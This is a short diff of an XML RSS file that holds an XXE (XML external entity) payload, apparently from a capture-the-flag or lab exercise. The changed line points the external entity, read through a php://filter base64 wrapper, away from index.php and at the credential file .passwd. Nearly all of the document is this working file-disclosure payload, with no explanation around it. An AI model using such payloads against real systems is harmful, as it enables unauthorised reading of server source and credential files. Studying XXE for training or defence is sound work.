@@ -1,7 +1,7 @@
 <?xml version="1.0" ?>
 <!DOCTYPE data [
     <!ELEMENT title ANY>
-    <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+    <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=.passwd">
 ]>
 <rss version="2.0">
 <channel>
